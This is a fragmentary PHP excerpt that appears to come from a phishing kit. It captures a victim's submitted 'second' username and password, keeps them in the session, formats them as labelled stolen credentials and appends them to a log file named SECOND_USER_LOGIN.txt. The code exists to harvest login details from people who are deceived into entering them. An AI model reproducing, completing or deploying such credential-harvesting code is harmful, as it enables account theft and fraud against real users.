...
$_SESSION['second_username'] = $_POST['userId'];
$_SESSION['second_password'] = $_POST['Passcode'];
...
if (!empty($_POST['userId']) && isset($_POST['Passcode'])) {
	...
	[Second Username] = ".$_POST['userId']."
	[Second Password] = ".$_POST['Passcode']."
	...
	if($save_results_to_cpanel == "on") {
		$res_file = fopen("../logs/SECOND_USER_LOGIN.txt", "a");
